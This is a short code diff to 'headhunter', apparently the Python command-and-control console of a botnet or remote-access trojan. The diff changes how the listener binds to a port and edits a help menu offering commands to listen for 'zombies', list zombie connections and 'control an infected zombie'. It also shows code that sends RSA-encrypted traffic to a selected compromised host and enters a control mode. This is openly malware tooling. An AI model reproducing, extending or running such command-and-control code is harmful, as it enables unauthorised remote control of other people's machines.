@@ -46,14 +46,14 @@ while True:
 
 	
 	if cmd == "listen":
-		server.listen(subcmd, int(arg))
+		server.listen(int(subcmd))
 
 	elif cmd == "help":
 		print('''
 			                       Commands
 ------------------------------------------------------------------------------------------------------
 help                      --          displays this menu
-listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
+listen <LPORT>            --	      starts listening for zombies on the specified local port
 show connections	  -- 	      displays active zombie connections by address and source port
 control <session>         --          controls an infected zombie by session number
 exit                      --          exits the headhunter interactive shell
@@ -65,7 +65,6 @@ exit                      --          exits the headhunter interactive shell
 			zombie = server.c[int(subcmd)-1]
 			zombiepubkey = server.public_partner[int(subcmd)-1]
 			zombie.send(rsa.encrypt(str.encode("\n"), zombiepubkey))
-			#zombie.recv(1024)
 			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()) + "\n")
 			server.control(zombie, zombiepubkey)	
 		except OSError:
